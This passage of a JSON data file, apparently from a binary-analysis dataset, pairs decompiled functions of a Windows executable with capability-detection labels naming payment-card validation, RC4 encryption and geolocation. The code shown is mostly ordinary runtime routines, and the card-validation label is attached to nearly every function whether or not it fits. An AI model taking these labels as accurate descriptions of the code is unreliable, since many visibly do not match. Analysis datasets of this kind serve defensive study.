        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0040a704(double *arg_8h, uint arg_ch)\n\n{\n    double *in_EAX;\n    uint16_t in_CX;\n    uint16_t in_DX;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    if ((((in_EAX < 0x18) && (in_DX < 0x3c)) && (in_CX < 0x3c)) && (arg_ch < 1000)) {\n        *arg_8h = ((in_EAX & 0xffff) * 3600000 + in_DX * 60000 + in_CX * 1000 + arg_ch) / *0x40a770;\n        var_1h._0_1_ = 1;\n        in_EAX = arg_8h;\n    }\n    return in_EAX & 0xffffff00 | var_1h;\n}\n",
        "token_count": 238
    },
    "0040a774": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.0040a774(uint32_t arg_8h)\n\n{\n    char cVar1;\n    uint32_t in_EAX;\n    uint var_8h;\n    \n    cVar1 = fcn.0040a704(&var_8h, in_EAX & 0xffff0000 | arg_8h & 0xffff);\n    if (cVar1 == '\\0') {\n        fcn.004087e0();\n    }\n    return _var_8h;\n}\n",
        "token_count": 111
    },
    "0040a7b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a7b4(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint in_EDX;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040a60c(arg_ch, arg_10h, &var_4h);\n    fcn.004087c4(arg_ch);\n    fcn.004087c4(in_EDX);\n    fcn.004087c4(arg_8h);\n    return;\n}\n",
        "token_count": 112
    },
    "0040a91c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0040a91c(void)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint auStack20 [2];\n    \n    puVar2 = auStack20;\n    cVar1 = fcn.0040a84c(auStack20);\n    if (cVar1 == '\\0') {\n        fcn.004087e0();\n    }\n    return CONCAT44(auStack20[0], puVar2);\n}\n",
        "token_count": 101
    },
    "0040a94c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040a94c(int16_t *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint16_t uVar1;\n    int16_t iVar2;\n    uint16_t uVar3;\n    int16_t *in_EAX;\n    int32_t iVar4;\n    uint16_t *in_EDX;\n    uint32_t uVar5;\n    int16_t iVar6;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int16_t var_10h;\n    uint16_t var_eh;\n    int16_t *var_ch;\n    uint16_t *var_8h;\n    int16_t *var_4h;\n    \n    var_8h = in_EDX;\n    var_4h = in_EAX;\n    fcn.0040a60c(arg_ch, arg_10h);\n    if (var_18h < 1) {\n        *var_4h = 0;\n        *var_8h = 0;\n        *var_ch = 0;\n        *arg_8h = 0;\n        uVar5 = 0;\n    }\n    else {\n        *arg_8h = var_18h % 7 + 1;\n        iVar6 = 1;\n        for (iVar4 = var_18h + -1; 0x23ab0 < iVar4; iVar4 = iVar4 + -0x23ab1) {\n            iVar6 = iVar6 + 400;\n        }\n        fcn.004087c4(&var_eh);\n        if (var_10h == 4) {\n            var_10h = 3;\n            var_eh = var_eh + 0x8eac;\n        }\n        iVar2 = var_10h * 0x68;\n        fcn.004087c4(&var_eh);\n        fcn.004087c4(&var_eh);\n        if (var_10h == 4) {\n            var_10h = 3;\n            var_eh = var_eh + 0x16d;\n        }\n        uVar5 = fcn.0040a810();\n        uVar3 = 1;\n        for (; uVar1 = *((uVar5 & 0xff) * 0x18 + 0x4830de + uVar3 * 2),  uVar1 <= var_eh; var_eh = var_eh - uVar1) {\n            uVar3 = uVar3 + 1;\n        }\n        *var_4h = iVar6 + iVar2 + var_10h;\n        *var_8h = uVar3;\n        *var_ch = var_eh + 1;\n    }\n    return uVar5;\n}\n",
        "token_count": 614
    },
    "0040aabc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040aabc(uint arg_8h, uint arg_ch)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    fcn.0040a60c(arg_8h, arg_ch);\n    return var_4h % 7 + 1;\n}\n",
        "token_count": 72
    },
    "0040aae4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t fcn.0040aae4(void)\n\n{\n    int16_t iStack20;\n    \n    iStack20 = *0x10 + -0x10;\n    sub.kernel32.dll_GetLocalTime();\n    return iStack20;\n}\n",
        "token_count": 55
    },
    "0040aaf8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040aaf8(int32_t arg_8h)\n\n{\n    int32_t in_EDX;\n    int32_t iVar1;\n    \n    iVar1 = 0x100 - *(arg_8h + -0x104);\n    if (in_EDX < iVar1) {\n        iVar1 = in_EDX;\n    }\n    if (iVar1 != 0) {\n        fcn.00402d34();\n    }\n    *(arg_8h + -0x104) = *(arg_8h + -0x104) + iVar1;\n    return;\n}\n",
        "token_count": 131
    },
    "0040ab5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040ab5c(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch._0_1_ = 0;\n    var_14h._0_1_ = 0;\n    arg_8h_00 = 1;\n    fcn.00409588(1, &var_20h, 4);\n    fcn.0040aaf8(arg_8h_00);\n    return;\n}\n",
        "token_count": 152
    },
    "0040b69c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040b69c(uint param_1, int32_t param_2)\n\n{\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    \n    if (param_2 == 0) {\n        fcn.0040aec4(&stack0xfffffffc);\n    }\n    else {\n        fcn.0040aec4(&stack0xfffffffc);\n    }\n    fcn.004046b8();\n    return;\n}\n",
        "token_count": 106
    },
    "0040b7c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040b7c4(int32_t param_1, int32_t *param_2)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puStack40;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack32 = 0x40b83d;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puVar1 = &stack0xfffffffc;\n    if (param_1 != 0) {\n        fcn.0040b70c();\n        puStack40 = &fcn.0040b7c4::var_8h;\n        fcn.00404888();\n        fcn.00404ae8();\n        iVar2 = fcn.00408ab8();\n        puVar1 = puStack28;\n        if (iVar2 == 0) {\n            iVar2 = fcn.00404888();\n            *param_2 = *param_2 + iVar2;\n            puVar1 = puStack28;\n        }\n    }\n    puStack28 = puVar1;\n    *in_FS_OFFSET = puStack40;\n    uStack32 = 0x40b844;\n    iStack36 = 0x40b83c;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 345
    },
    "0040bf04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0040bf04(void)\n\n{\n    char cVar1;\n    double dStack20;\n    \n    cVar1 = fcn.0040bf38();\n    if (cVar1 == '\\0') {\n        fcn.004087f8();\n    }\n    return dStack20;\n}\n",
        "token_count": 68
    },
    "0040bf6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0040bf6c(void)\n\n{\n    char cVar1;\n    double dStack20;\n    \n    cVar1 = fcn.0040bfa0();\n    if (cVar1 == '\\0') {\n        fcn.004087f8();\n    }\n    return dStack20;\n}\n",
        "token_count": 70
    },
    "0040bfd4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0040bfd4(void)\n\n{\n    char cVar1;\n    double dStack20;\n    \n    cVar1 = fcn.0040c008();\n    if (cVar1 == '\\0') {\n        fcn.004087f8();\n    }\n    return dStack20;\n}\n",
        "token_count": 68
    },
    "0040c008": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040c008(uint param_1, double *param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    double dStack28;\n    \n    uVar3 = 1;\n    cVar1 = fcn.0040b9cc();\n    if (cVar1 == '\\0') {\ncode_r0x0040c053:\n        uVar3 = fcn.0040bfa0();\n    }\n    else {\n        iVar2 = fcn.00404888();\n        if (0 < iVar2) {\n            cVar1 = fcn.0040bd10();\n            if (cVar1 == '\\0') goto code_r0x0040c053;\n        }\n        if (dStack28 < *0x40c090) {\n            *param_2 = dStack28 - 0.0;\n        }\n        else {\n            *param_2 = dStack28 + 0.0;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 226
    },
    "0040c094": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040c094(void)\n\n{\n    int32_t iVar1;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack276;\n    uchar *puStack272;\n    uint uStack268;\n    uint uStack264;\n    uchar auStack260 [256];\n    \n    uStack264 = 0;\n    uStack268 = 0x100;\n    puStack272 = &stack0xfffffefc;\n    uStack276 = 0;\n    uStack284 = 0;\n    uStack288 = 0x3200;\n    uStack292 = 0x40c0b8;\n    for (iVar1 = sub.kernel32.dll_FormatMessageA();\n        (0 < iVar1 && (((&stack0xfffffedf)[iVar1] < 0x21 || ((&stack0xfffffedf)[iVar1] == 0x2e)))); iVar1 = iVar1 + -1)\n    {\n    }\n    uStack292 = 0x40c0d7;\n    fcn.004046b8();\n    return;\n}\n",
        "token_count": 239
    },
    "0040c0e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get geographical location"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c0e0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint lpLCData;\n    \n    iVar1 = sub.kernel32.dll_GetLocaleInfoA_1();\n    if (iVar1 < 1) {\n        fcn.0040461c();\n    }\n    else {\n        fcn.004046b8();\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "0040c190": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040c190(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    var_14h = 0;\n    var_18h = 0;\n    uStack48 = 0x40c2a3;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    var_4h = sub.kernel32.dll_GetThreadLocale_1();\n    iVar1 = 1;\n    do {\n        fcn.0040c154(&var_ch, 0xb, &stack0xfffffffc);\n        fcn.0040461c();\n        fcn.0040c154(&var_10h, 0xb, &stack0xfffffffc);\n        fcn.0040461c();\n        iVar1 = iVar1 + 1;\n    } while (iVar1 != 0xd);\n    iVar1 = 1;\n    do {\n        var_8h = (iVar1 + 5) % 7;\n        fcn.0040c154(&var_14h, 6, &stack0xfffffffc);\n        fcn.0040461c();\n        fcn.0040c154(&var_18h, 6, &stack0xfffffffc);\n        fcn.0040461c();\n        iVar1 = iVar1 + 1;\n    } while (iVar1 != 8);\n    *in_FS_OFFSET = uStack52;\n    fcn.004045ec(0x40c2aa);\n    return;\n}\n",
        "token_count": 437
    },
    "0040c368": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040c368(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    code **in_FS_OFFSET;\n    code *in_stack_ffffffc4;\n    code *pcStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack20 = 0x40c3ff;\n    pcStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &pcStack24;\n    puVar3 = &var_4h;\n    sub.kernel32.dll_GetThreadLocale_1();\n    fcn.0040c0e0(puVar3);\n    iVar1 = fcn.00408da0();\n    if (iVar1 - 3U < 3) {\n        uVar2 = sub.kernel32.dll_GetThreadLocale_1(iVar1, 4);\n        sub.kernel32.dll_EnumCalendarInfoA(fcn.0040c2b4, uVar2);\n        iVar4 = 7;\n        puVar3 = 0x485770;\n        do {\n            *puVar3 = 0xffffffff;\n            puVar3 = puVar3 + 1;\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n        uVar2 = sub.kernel32.dll_GetThreadLocale_1(iVar1, 3);\n        in_stack_ffffffc4 = fcn.0040c2f0;\n        sub.kernel32.dll_EnumCalendarInfoA(fcn.0040c2f0, uVar2);\n    }\n    *in_FS_OFFSET = in_stack_ffffffc4;\n    fcn.004045c8(0x40c406);\n    return;\n}\n",
        "token_count": 406
    },
    "0040c64c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040c64c(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_EDX;\n    uint var_45ch;\n    uint *var_35ch;\n    uint var_358h;\n    uint *var_354h;\n    uint var_350h;\n    int32_t var_34ch;\n    uint var_348h;\n    int32_t var_344h;\n    uint var_340h;\n    uint var_33ch;\n    uint var_338h;\n    uint var_334h;\n    int32_t var_330h;\n    int32_t var_324h;\n    uint var_316h;\n    uint var_216h;\n    uint var_111h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    sub.kernel32.dll_VirtualQuery_1();\n    if (var_324h == 0x1000) {\n        iVar3 = var_330h;\n        iVar2 = sub.kernel32.dll_GetModuleFileNameA_1(var_330h, &var_216h, 0x105);\n        if (iVar2 != 0) {\n            var_ch = in_EDX - var_330h;\n            goto code_r0x0040c6c1;\n        }\n    }\n    iVar3 = *0x485668;\n    sub.kernel32.dll_GetModuleFileNameA_1();\n    var_ch = fcn.0040c640();\ncode_r0x0040c6c1:\n    fcn.0040d728(iVar3);\n    fcn.004092f0();\n    var_4h = 0x40c7dc;\n    var_8h = 0x40c7dc;\n    cVar1 = fcn.004039b8();\n    if (cVar1 != '\\0') {\n        var_4h = fcn.00404a88();\n        iVar3 = fcn.0040928c();\n        if ((iVar3 != 0) && (*(var_4h + -1 + iVar3) != '.')) {\n            var_8h = 0x40c7e0;\n        }\n    }\n    uVar4 = fcn.00405c20(*(*0x484810 + 4), &var_316h, 0x100);\n    sub.user32.dll_LoadStringA_1(uVar4);\n    fcn.00403770();\n    var_35ch = &var_45ch;\n    var_358h._0_1_ = 4;\n    var_354h = &var_111h;\n    var_350h._0_1_ = 6;\n    var_34ch = var_ch;\n    var_348h._0_1_ = 5;\n    var_344h = var_4h;\n    var_340h._0_1_ = 6;\n    var_33ch = var_8h;\n    var_338h._0_1_ = 6;\n    fcn.0040994c(4, &var_35ch);\n    fcn.0040928c();\n    return;\n}\n",
        "token_count": 720
    },
    "0040c8dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040c8dc(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.0040461c();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 132
    },
    "0040c918": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c918(uint arg_8h, uint arg_ch)\n\n{\n    char in_DL;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (in_DL != '\\0') {\n        puStack40 = 0x40c92c;\n        fcn.00403b58();\n    }\n    uStack44 = 0x40c972;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    arg_8h_00 = &fcn.0040c918::var_4h;\n    puStack40 = &stack0xfffffffc;\n    fcn.00409998(arg_8h_00);\n    fcn.0040461c();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack44 = 0x40c979;\n    iStack48 = 0x40c971;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 258
    },
    "0040c998": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040c998(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.0040675c();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 131
    },
    "0040c9d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c9d4(uint arg_8h, uint arg_ch)\n\n{\n    char in_DL;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (in_DL != '\\0') {\n        puStack44 = 0x40c9ea;\n        fcn.00403b58();\n    }\n    uStack48 = 0x40ca40;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    arg_8h_00 = &fcn.0040c9d4::var_4h;\n    puStack44 = &stack0xfffffffc;\n    fcn.0040675c();\n    fcn.00409998(arg_8h_00);\n    fcn.0040461c();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack48 = 0x40ca47;\n    iStack52 = 0x40ca3f;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 277
    },
    "0040ca68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040ca68(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00403b58();\n        in_DL = extraout_DL;\n    }\n    fcn.0040461c();\n    *(in_EAX + 8) = arg_8h;\n    if (in_DL != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 148
    },
    "0040cbb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040cbb0(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack56 = 0x40cc4c;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack60;\n    if (in_EAX == 0) {\n        fcn.0040675c();\n    }\n    else {\n        puStack52 = &stack0xfffffffc;\n        fcn.00404660();\n    }\n    var_1ch = var_4h;\n    var_18h._0_1_ = 0xb;\n    var_10h._0_1_ = 0xb;\n    var_8h._0_1_ = 0;\n    arg_ch = &var_1ch;\n    arg_8h = 2;\n    var_14h = param_2;\n    fcn.0040675c();\n    fcn.0040c918(arg_8h, arg_ch);\n    *in_FS_OFFSET = arg_8h;\n    uStack60 = 0x40cc53;\n    fcn.004045c8();\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 389
    },
    "0040cc6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040cc6c(uint arg_8h)\n\n{\n    fcn.0040cbb0();\n    fcn.0040cc5c();\n    return;\n}\n",
        "token_count": 43
    },
    "0040cca0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040cca0(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    unkbyte3 Var3;\n    int32_t iVar2;\n    \n    iVar1 = *in_EAX;\n    Var3 = iVar1 >> 8;\n    if (iVar1 < -0x3fffff6d) {\n        iVar2 = iVar1;\n        if (iVar1 == -0x3fffff6e) {\ncode_r0x0040cd04:\n            return CONCAT31(iVar2 >> 8, 6);\n        }\n        if (iVar1 < -0x3fffff71) {\n            if (iVar1 == -0x3fffff72) {\n                return CONCAT31(Var3, 7);\n            }\n            if (iVar1 == -0x3ffffffb) {\n                return 0xb;\n            }\n            if (iVar1 == -0x3fffff74) {\n                return 4;\n            }\n            iVar2 = iVar1 + 0x3fffff73;\n            if (iVar2 == 0) goto code_r0x0040cd0d;\n        }\n        else {\n            iVar2 = iVar1 + 0x3fffff6f;\n            if (iVar1 + 0x3fffff71U < 2) goto code_r0x0040cd04;\n            if (iVar2 == 0) {\n                return 8;\n            }\n        }\n    }\n    else if (iVar1 < -0x3fffff69) {\n        if (iVar1 == -0x3fffff6a) {\n            return CONCAT31(Var3, 0xc);\n        }\n        iVar2 = iVar1 + 0x3fffff6d;\n        if (iVar2 == 0) {\ncode_r0x0040cd0d:\n            return CONCAT31(iVar2 >> 8, 9);\n        }\n        if (iVar1 == -0x3fffff6c) {\n            return 3;\n        }\n        iVar2 = iVar1 + 0x3fffff6b;\n        if (iVar2 == 0) {\n            return 5;\n        }\n    }\n    else {\n        if (iVar1 == -0x3fffff03) {\n            return 0xe;\n        }\n        iVar2 = iVar1 + 0x3ffffec6;\n        if (iVar2 == 0) {\n            return 0xd;\n        }\n    }\n    return CONCAT31(iVar2 >> 8, 0x16);\n}\n",
        "token_count": 552
    },
    "0040d17c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get file version info"
        ],
        "decompiled_code": "\nvoid fcn.0040d17c(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffa0;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint puLen;\n    int32_t lplpBuffer;\n    uint pBlock;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack40 = 0x40d252;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    var_4h = 0xffffffff;\n    puStack48 = 0x40d1a9;\n    fcn.00404660();\n    puStack48 = 0x40d1b1;\n    fcn.00404ad8();\n    puStack48 = &fcn.0040d17c::var_ch;\n    uStack52 = 0x40d1bd;\n    uStack52 = fcn.00404a88();\n    puStack56 = 0x40d1c3;\n    iVar1 = sub.version.dll_GetFileVersionInfoSizeA();\n    if (iVar1 != 0) {\n        puStack56 = 0x40d1d0;\n        pBlock = fcn.00402b14();\n        uStack60 = 0x40d235;\n        uStack64 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc0;\n        puStack56 = &stack0xfffffffc;\n        uVar2 = fcn.00404a88(var_ch, iVar1, pBlock);\n        iVar1 = sub.version.dll_GetFileVersionInfoA(uVar2);\n        if (iVar1 != 0) {\n            in_stack_ffffffa0 = pBlock;\n            iVar1 = sub.version.dll_VerQueryValueA(pBlock, 0x40d264, &fcn.0040d17c::lplpBuffer, &fcn.0040d17c::puLen);\n            if (iVar1 != 0) {\n                var_4h = *(lplpBuffer + 8);\n            }\n        }\n        *in_FS_OFFSET = in_stack_ffffffa0;\n        fcn.00402b44(0x40d23c);\n        return;\n    }\n    *in_FS_OFFSET = uStack52;\n    uStack44 = 0x40d259;\n    puStack48 = 0x40d251;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 609
    },
    "0040d7b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get geographical location"
        ],
        "decompiled_code": "\nvoid fcn.0040d7b8(void)\n\n{\n    uint in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint lpLCData;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x40d81c;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    uVar1 = 7;\n    sub.kernel32.dll_GetLocaleInfoA_1();\n    fcn.00404838();\n    sub.kernel32.dll_GetACP(0);\n    fcn.00408da0();\n    *in_FS_OFFSET = in_EAX;\n    fcn.004045c8(0x40d823, uVar1);\n    return;\n}\n",
        "token_count": 189
    },
    "0040ded0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040ded0(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd0;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x40df60;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    iVar1 = sub.kernel32.dll_GetLastError();\n    if (iVar1 == 0) {\n        iVar2 = fcn.0040c998();\n    }\n    else {\n        var_ch._0_1_ = 0;\n        var_10h = iVar1;\n        fcn.0040c094();\n        var_8h = 0;\n        var_4h._0_1_ = 0xb;\n        in_stack_ffffffd0 = 1;\n        iVar2 = fcn.0040c9d4(1, &var_10h);\n    }\n    *(iVar2 + 0xc) = iVar1;\n    fcn.00403fc0();\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    uStack40 = 0x40df67;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 338
    },
    "0040e35c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
